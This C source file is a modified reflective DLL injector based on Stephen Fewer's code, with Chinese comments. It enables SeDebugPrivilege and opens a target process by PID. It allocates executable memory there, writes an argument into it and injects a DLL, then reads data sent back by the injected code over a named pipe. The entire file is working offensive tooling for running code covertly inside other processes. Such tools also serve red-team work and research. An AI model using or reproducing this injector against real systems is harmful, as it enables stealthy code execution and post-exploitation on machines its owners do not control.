//===============================================================================================//
// Copyright (c) 2012, Stephen Fewer of Harmony Security (www.harmonysecurity.com)
// All rights reserved.
// 
// Redistribution and use in source and binary forms, with or without modification, are permitted 
// provided that the following conditions are met:
// 
//     * Redistributions of source code must retain the above copyright notice, this list of 
// conditions and the following disclaimer.
// 
//     * Redistributions in binary form must reproduce the above copyright notice, this list of 
// conditions and the following disclaimer in the documentation and/or other materials provided 
// with the distribution.
// 
//     * Neither the name of Harmony Security nor the names of its contributors may be used to
// endorse or promote products derived from this software without specific prior written permission.
// 
// THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR 
// IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND
// FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR 
// CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR 
// CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR 
// SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY 
// THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR 
// OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE 
// POSSIBILITY OF SUCH DAMAGE.
//===============================================================================================//
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include "LoadLibraryR.h"
#pragma comment(lib,"Advapi32.lib")

#define BREAK_WITH_ERROR( e ) { printf( "[-] %s. Error=%d", e, GetLastError() ); break; }

// Simple app to inject a reflective DLL into a process vis its process ID.
int main( int argc, char * argv[] )
{
	HANDLE hFile          = NULL;
	HANDLE hModule        = NULL;
	HANDLE hProcess       = NULL;
	HANDLE hToken         = NULL;
	LPVOID lpBuffer       = NULL;
	BOOL	bWriteSuccess;
	DWORD dwLength        = 0;
	DWORD dwBytesRead     = 0;
	DWORD dwProcessId     = 0;
	DWORD	argSize;
	char* cpDllFile = "";
	char* arg = "";
	SIZE_T	numBytes;
	TOKEN_PRIVILEGES priv = {0};
	LPVOID	lpRemoteMem = NULL;


	do
	{
		// Usage: inject.exe [pid][dll_file] [arg]
		if (argc >= 4)
		{ 
			//dwProcessId = GetCurrentProcessId();
			dwProcessId = atoi(argv[1]);
			cpDllFile = argv[2];
			arg = argv[3];
		}
		else
		{
			printf("Usage: inject.exe [dll_file] [arg]");
			break;
		}

		hFile = CreateFileA( cpDllFile, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL );
		if( hFile == INVALID_HANDLE_VALUE )
			BREAK_WITH_ERROR( "Failed to open the DLL file" );

		dwLength = GetFileSize( hFile, NULL );
		if( dwLength == INVALID_FILE_SIZE || dwLength == 0 )
			BREAK_WITH_ERROR( "Failed to get the DLL file size" );

		lpBuffer = HeapAlloc( GetProcessHeap(), 0, dwLength );
		if( !lpBuffer )
			BREAK_WITH_ERROR( "Failed to get the DLL file size" );

		if( ReadFile( hFile, lpBuffer, dwLength, &dwBytesRead, NULL ) == FALSE )
			BREAK_WITH_ERROR( "Failed to alloc a buffer!" );

		if( OpenProcessToken( GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken ) )
		{
			priv.PrivilegeCount           = 1;
			priv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
		
			if( LookupPrivilegeValue( NULL, SE_DEBUG_NAME, &priv.Privileges[0].Luid ) )
				AdjustTokenPrivileges( hToken, FALSE, &priv, 0, NULL, NULL );

			CloseHandle( hToken );
		}

		hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, dwProcessId);
		if( !hProcess )
			BREAK_WITH_ERROR( "Failed to open the target process" );
		lpRemoteMem = arg;
		// 申请内存
		argSize = strlen(arg);
		lpRemoteMem = VirtualAllocEx(hProcess, NULL, argSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
		if (!lpRemoteMem)
		{
			BREAK_WITH_ERROR("\t\t[!] FAILED to allocate memory in process.\n");
			CloseHandle(hProcess);
			break;
		}

		printf("[+] Memory allocated at : 0x%d in process %d\n", lpRemoteMem, dwProcessId);
		printf("[+] Attempting to write parameter in  process %d \n", dwProcessId);


		//将参数写入目标进程
		bWriteSuccess = WriteProcessMemory(hProcess, lpRemoteMem, arg, argSize, &numBytes);

		if (!bWriteSuccess)
		{
			printf("[!] FAILED to write parameter. Wrote %d  bytes instead of %d bytes.\n ", numBytes ,argSize);

			CloseHandle(hProcess);
			break;
		}
		printf("[+] Wrote parameter in remote process %d memory.\n", dwProcessId);

		//将参数指针传入
		hModule = LoadRemoteLibraryR( hProcess, lpBuffer, dwLength, lpRemoteMem);
		if( !hModule )
			BREAK_WITH_ERROR( "Failed to inject the DLL" );

		printf( "[+] Injected the '%s' DLL into process %d.\n", cpDllFile, dwProcessId);

		//接收

		srand(time(NULL));

		char buf[256] = "";
		DWORD rlen = 0;
		HANDLE hPipe = CreateNamedPipe(
			TEXT("\\\\.\\Pipe\\mypipe"),						//管道名
			PIPE_ACCESS_DUPLEX,									//管道类型 
			PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,	//管道参数
			PIPE_UNLIMITED_INSTANCES,							//管道能创建的最大实例数量
			0,													//输出缓冲区长度 0表示默认
			0,													//输入缓冲区长度 0表示默认
			NMPWAIT_WAIT_FOREVER,								//超时时间
			NULL);													//指定一个SECURITY_ATTRIBUTES结构,或者传递零值.
		if (INVALID_HANDLE_VALUE == hPipe)
		{
			printf("[+] Create Pipe Error(%d)\n", GetLastError());
		}
		else
		{
			printf("[+] Create Pipe Success\n");
			printf("[+] Waiting For Client Connection...\n");
			if (ConnectNamedPipe(hPipe, NULL) == NULL)	//阻塞等待客户端连接。
			{
				printf("[+] Connection failed!\n");
			}
			else
			{
				printf("[+] Connection Success!\n");
			}
			printf("[+] Data From Pipe :\n\n");
			while (1)
			{
				if (ReadFile(hPipe, buf, 256, &rlen, NULL)) //接受客户端发送过来的内容
				{
					printf("\t%s", buf);
				}
				else
				{
					printf("\n[+] Read Data From Pipe End!\n");
					break;
				}
			}
			CloseHandle(hPipe);//关闭管道
		}

		
		WaitForSingleObject( hModule, -1 );



	} while( 0 );

	if( lpBuffer )
		HeapFree( GetProcessHeap(), 0, lpBuffer );

	if( hProcess )
		CloseHandle( hProcess );

	return 0;
}